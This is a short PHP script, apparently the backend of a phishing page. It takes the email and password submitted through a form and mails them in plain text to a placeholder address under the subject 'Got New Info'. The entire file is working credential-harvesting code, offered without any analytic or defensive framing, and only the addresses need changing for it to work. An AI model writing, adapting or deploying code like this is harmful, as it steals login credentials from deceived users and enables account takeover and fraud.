<?php
$email  = $_POST['email'];
$pass = $_POST['pass'];

$to = "somebody@example.com";
$subject = "Got New Info";
$txt = "Hello.. Here is a new infomatin. Email: $email and Pass: $pass";
$headers = "From: testfilter@example.com";

mail($to,$subject,$txt,$headers);


?>